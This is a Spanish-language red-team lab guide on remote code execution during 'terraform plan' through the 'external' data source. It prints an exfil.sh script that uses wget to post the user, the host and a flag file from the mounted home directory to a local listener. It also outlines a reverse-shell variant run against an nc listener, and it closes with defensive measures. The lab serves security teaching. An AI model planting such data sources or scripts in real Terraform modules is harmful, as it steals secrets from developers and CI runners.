# 12 - RCE en `terraform plan`

**Clase 4 · 25 min · M5 Terraform**
**Fase:** ejecucion en IaC (maquina del desarrollador o del runner)
**MITRE ATT&CK:** T1059 (Command and Scripting Interpreter), T1195.002 (Supply Chain)
**Riesgo OWASP CI/CD:** CICD-SEC-4 (pipeline envenenado), CICD-SEC-3 (abuso de dependencias)

## Escenario

El equipo usa Terraform para desplegar. Terraform tiene una feature oficial
poco conocida: el provider `external` ejecuta un programa local **durante el
plan** para rellenar un `data` source. No hace falta `apply`, ni un provider
malicioso, ni privilegios: un modulo aparentemente normal puede leer el home del
que ejecuta el plan y enviarlo fuera.

En este lab el "modulo" es local, pero el patron es el mismo que llega por un
modulo del registry o por un PR.

Caso real: CVE-2026-27900 (provider de Terraform para Linode anterior a 3.9.0)
no ejecutaba codigo: escribia passwords, tokens y contenido de StackScript en
logs de debug. Con `TF_LOG` alto en un job de CI, esos valores quedaban en el
log centralizado. Mismo pipeline, riesgo distinto: aqui CICD-SEC-4, alla
CICD-SEC-6.

## Objetivo de aprendizaje

- Ver que `terraform plan` no es una operacion de solo lectura.
- Identificar `data "external"` como ejecucion de codigo.
- Comprobar la exfiltracion en un receptor propio.

## Antes de empezar

No necesitas Terraform en el host: el wrapper lo ejecuta en un contenedor.

```bash
cd /home/ponciop/devops-redteam/lab/terraform/plan-rce
curl -s http://localhost:8888/__clear
cat main.tf
```

**Que esperar:** un `data "external" "exfil"` que apunta a `exfil.sh`.

## Paso 1 - Inicializar el proyecto

```bash
../../../tools/tf init -input=false
```

**Que esperar:** `Terraform has been successfully initialized!` y la descarga
del provider `hashicorp/external`. El wrapper monta `$PWD` en `/tf` y tu `$HOME`
en `/hosthome` (solo lectura), que es lo que hara posible la exfiltracion.

## Paso 2 - Ejecutar el plan

```bash
../../../tools/tf plan -input=false
```

**Que esperar:** `data.external.exfil: Read complete` seguido de
`No changes.` No se crea nada, pero el programa ya se ejecuto.

## Paso 3 - Ver lo que salio

```bash
curl -s http://localhost:8888/__requests \
  | python3 -c 'import sys,json;[print(x["path"],"|",x["body"][:100]) for x in json.load(sys.stdin)]'
```

**Que esperar:**

```
/tf/plan-rce-flag | FLAG{terraform_plan_rce}
/tf/plan-rce      | user=root host=<hostname>
```

| Path | Contenido |
|---|---|
| `/tf/plan-rce` | usuario y host de la maquina que ejecuto el plan |
| `/tf/plan-rce-flag` | contenido de `~/.devops-lab-tf-plan-flag` |

**Por que funciona:** `external` necesita la salida del programa para construir
el atributo `result` del data source. Terraform lo ejecuta al leer el data
source, que ocurre en el plan. No hay confirmacion ni `-auto-approve`.

## Paso 4 - Entender el script

```bash
cat exfil.sh
```

```sh
wget -qO- --post-data="user=$(id -un) host=$(hostname)" \
  http://localhost:8888/tf/plan-rce >/dev/null
wget -qO- --post-file=/hosthome/.devops-lab-tf-plan-flag \
  http://localhost:8888/tf/plan-rce-flag >/dev/null
echo '{"ok":"1"}'
```

El `echo` final no es decorativo: el provider exige JSON por stdout. Un script
que no lo devuelva hace fallar el plan, lo que delata el ataque. En un caso real
el atacante devuelve un JSON valido y el plan continua con normalidad.

## Paso 5 - Variante con shell interactiva

`revshell.sh` ya esta en el carpeta. Si quieres ver el patron:

```bash
cat revshell.sh
```

Para probarlo, cambia `program` en `main.tf` por
`["/bin/sh", "${path.module}/revshell.sh"]`, arranca `nc -lvnp 4444` y ejecuta
el plan. El plan se queda colgado mientras la shell vive: es el comportamiento
esperado.

## Evidencia para el informe

- `main.tf` con el `data` senalado.
- Salida de `plan` (`Read complete`, `No changes`).
- Peticiones en hookcat con usuario/host y el flag.
- Explicacion de por que no hizo falta `apply`.

## Checkpoint

1. En que fase de Terraform se ejecuta `data "external"` y por que?
2. Que otros bloques ejecutan codigo (`local-exec`, `remote-exec`)?
3. Por que el ataque pasa desapercibido en un pipeline efimero?

## Defensa

- `init` y `plan` en runner efimero y sin secretos en el entorno.
- Lock file y registry privado con allowlist de providers y modulos.
- Revisar cambios en `data.external`, `local-exec` y modulos nuevos en el PR.
- Egress filtering desde el runner.
- Policy as code (conftest/OPA) que prohiba `external` y `local-exec` sin
  justificacion.
